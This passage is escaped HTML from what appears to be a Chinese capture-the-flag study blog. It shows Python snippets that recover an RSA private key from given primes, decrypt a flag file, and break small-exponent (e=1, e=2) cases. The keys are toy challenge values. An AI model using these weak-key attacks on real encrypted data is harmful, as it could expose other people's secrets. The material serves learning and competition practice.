operator&#34;&gt;=&lt;/span&gt;pub_p&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;q&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;a&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;p&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;  gp&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;mpz&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;q &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;  gp&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;mpz&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;e &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;  gp&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;mpz&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;c &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;  gp&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;mpz&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;n &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; p&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;q&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;phi &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;q&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;d &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; gp&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;invert&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; phi&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;m &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;pow&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; d&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;m&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;根据enc文件pqe求d和key&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#根据enc文件pqe求d和key&#34;&gt;#&lt;/a&gt; 根据 enc 文件，p,q,e 求 d 和 key&lt;/h1&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; gmpy2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; rsa&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;285960468890451637935629440372639283459&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;q &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;304008741604601924494328155975272418463&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;e &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;65537&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;n &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; p &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; q&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;d &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; gmpy2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;invert&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;q&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;d&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;d &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;81176168860169991027846870170527607562179635470395365333547868786951080991441&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;key &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; rsa&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;PrivateKey&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;d&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;q&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;key&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;flag.enc&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;rb&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; f&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rsa&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decrypt&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;key&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;根据pem文件解密&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#根据pem文件解密&#34;&gt;#&lt;/a&gt; 根据 pem 文件解密&lt;/h1&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3Rvb2wuY2hhY3VvLm5ldC9jcnlwdHJzYXB1YmtleQ==&#34;&gt;RSA public key encryption and decryption&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;or 用 kali 跑 openssl&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NsaWZmb3JkUi9hcnRpY2xlL2RldGFpbHMvODI3NDcxMTI=&#34;&gt;RSA 解密 - 提供 enc 和 pem 文件类&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;e1&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#e1&#34;&gt;#&lt;/a&gt; e=1&lt;/h1&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; binascii&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; gmpy2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;N_hex&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x180be86dc898a3c3a710e52b31de460f8f350610bf63e6b2203c08fddad44601d96eb454a34dab7684589bc32b19eb27cffff8c07179e349ddb62898ae896f8c681796052ae1598bd41f35491175c9b60ae2260d0d4ebac05b4b6f2677a7609c2fe6194fe7b63841cec632e3a2f55d0cb09df08eacea34394ad473577dea5131552b0b30efac31c59087bfe603d2b13bed7d14967bfd489157aa01b14b4e1bd08d9b92ec0c319aeb8fedd535c56770aac95247d116d59cae2f99c3b51f43093fd39c10f93830c1ece75ee37e5fcdc5b174052eccadcadeda2f1b3a4a87184041d5c1a6a0b2eeaa3c3a1227bc27e130e67ac397b375ffe7c873e9b1c649812edcd&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;e_hex&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;c_hex&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x4963654354467b66616c6c735f61706172745f736f5f656173696c795f616e645f7265617373656d626c65645f736f5f63727564656c797d&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;c_hex &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; gmpy2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;mpz&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c_hex&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;N_hex &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; gmpy2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;mpz&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;N_hex&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;i &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; i&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    m_hex &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c_hex &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; gmpy2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;mpz&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;N_hex&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;m_hex&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;binascii&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;a2b_hex&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;m_hex&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;utf8&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;except&lt;/span&gt; binascii&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Error &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; e&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;位数非偶数，跳过...&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    i &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;e2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#e2&#34;&gt;#&lt;/a&gt; e=2&lt;/h1&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; gmpy&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; string&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; Crypto&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;PublicKey &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; RSA&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 读取公钥参数&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;./tmp/pubkey.pem&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;r&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; f&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    key &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; RSA&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;importKey&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;f&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    N &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; key&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;n&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    e &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; key&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;e&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;275127860351348928173285174381581152299&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;q &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;319576316814478949870590164193048041239&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;./tmp/flag.enc&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;r&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; f&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    cipher &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;encode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;hex&#39;&lt;/span&gt;&lt;span class=&#34;token 